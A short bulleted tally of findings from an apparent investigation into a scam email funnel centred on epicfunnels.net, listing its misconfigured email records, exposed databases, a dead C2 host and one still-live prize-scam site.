- **2** ActiveProspect domain verifications
- **2** conflicting SPF records on epicfunnels.net
- **1** operating entity: Moxxi Media (M365 tenant only, no domain)
- **1** backend platform: CustomerTestConnect (Express.js + Handlebars)
- **1** DKIM key that says "NOT ACTIVATED"
- **1** sinkholed tracker
- **1** dead Node.js app on EC2
- **1** completely open Redis (cryptojacked by bots)
- **1** PostgreSQL database on the public internet
- **1** admin panel exposed to the world
- **1** expired domain (olivimails.com, WHOIS gone)
- **1** dead C2 server (oracle.zzhreceive.top)
- **0** working parts of the epicfunnels.net scam funnel
- **1** fully operational site: myamericanprizes.com
